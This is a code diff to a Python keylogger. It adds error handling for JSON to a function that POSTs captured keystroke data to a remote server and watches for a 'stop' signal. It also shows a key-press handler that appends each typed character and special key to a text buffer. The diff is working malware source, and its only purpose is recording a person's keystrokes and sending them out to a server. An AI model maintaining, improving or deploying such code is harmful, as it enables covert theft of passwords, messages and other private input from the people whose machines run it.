@@ -50,10 +50,14 @@ def send_post_req():
         response.raise_for_status()  # Raise exception for HTTP errors
         logging.info("Data sent successfully.")
 
-        # Check for stop signal from the server
-        if response.json().get("stop", False):
-            logging.info("Stop signal received from server.")
-            stop_event.set()
+        # Check if the response is valid JSON
+        try:
+            response_json = response.json()
+            if response_json.get("stop", False):
+                logging.info("Stop signal received from server.")
+                stop_event.set()
+        except json.JSONDecodeError:
+            logging.error("Invalid JSON response from server.")
     except requests.exceptions.RequestException as e:
         logging.error(f"Request failed: {e}")
     finally:
@@ -84,7 +88,7 @@ def on_press(key):
                 stop_keylogger()
                 return False  # Stop the listener
             elif hasattr(key, 'char') and key.char:  # Check if the key has a character representation
-                text += key.char
+                text += key.char  # Append the character as-is
             else:
                 text += f"[{key.name}]"  # Handle special keys like Ctrl, Alt, etc.
     except Exception as e:
